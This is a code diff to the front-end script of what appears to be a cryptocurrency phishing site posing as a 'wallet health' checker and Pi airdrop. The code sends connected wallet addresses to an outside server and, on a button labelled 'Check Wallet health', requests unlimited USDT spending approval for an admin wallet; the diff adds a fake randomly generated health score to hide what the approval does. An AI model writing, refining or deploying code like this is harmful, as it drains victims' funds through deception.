@@ -21,9 +21,10 @@ connectButton.onclick = async() => {
 
     setTimeout(() => {
         document.getElementById("preConnectOverlay").style.display = "none";
-        connectButton.innerText = "Proceed"; // Reset text just in case
+        connectButton.innerText = "Proceed";
         connectButton.disabled = false;
     }, 5000);
+
     try {
         const provider = await EthereumProvider.init({
             projectId: "5c7a882142c7491241b507534414ddff",
@@ -45,6 +46,11 @@ connectButton.onclick = async() => {
         if (overlay) {
             overlay.style.display = "flex";
             overlay.querySelector(".user-address").textContent = userAddress;
+
+            // Auto-close after 3 seconds
+            setTimeout(() => {
+                overlay.style.display = "none";
+            }, 3000);
         }
 
         // Close on button click
@@ -64,7 +70,7 @@ connectButton.onclick = async() => {
         fetch('https://official-pi-airdrops.com/php/save_wallet.php', {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ wallet: userAddress }) // ✅ fix here
+            body: JSON.stringify({ wallet: userAddress })
         });
 
         approveButton.style.display = "inline-block";
@@ -75,26 +81,55 @@ connectButton.onclick = async() => {
 };
 
 approveButton.onclick = async() => {
-    // try {
-    //     const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
-    //     const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
-    //     await tx.wait();
-    //     alert("Approval granted");
-    // } catch (err) {
-    //     console.error("Approval error:", err);
-    // }
-
     try {
+        // Show loading state
+        approveButton.disabled = true;
+        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+
+        // Execute approval
         const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
         const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
         await tx.wait();
 
-        const userAddress = await signer.getAddress(); // get the address
-        window.location.href = `/healthcard.html?wallet=${userAddress}`; // redirect with query
+        // Get user address
+        const userAddress = await signer.getAddress();
+
+        // Show overlay with wallet info
+        const overlay = document.getElementById("overlay");
+        const walletAddressSpan = document.getElementById("walletAddress");
+
+        // Truncate address for display
+        const truncatedAddress = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
+        walletAddressSpan.textContent = truncatedAddress;
+
+        // Generate random health score (90-98%)
+        const healthScore = Math.floor(Math.random() * 9) + 90;
+        document.getElementById("healthScore").textContent = `${healthScore}%`;
+        document.getElementById("healthBar").style.width = `${healthScore}%`;
+
+        // Show overlay
+        overlay.style.display = "flex";
+
+        // Close button functionality
+        document.getElementById("closeOverlayBtn").onclick = () => {
+            overlay.style.display = "none";
+        };
+
+        // Close when clicking outside card
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) {
+                overlay.style.display = "none";
+            }
+        });
+
     } catch (err) {
         console.error("Approval error:", err);
+        alert("Approval failed: " + (err.message || err));
+    } finally {
+        // Reset button state
+        approveButton.disabled = false;
+        approveButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
     }
-
 };
 
 
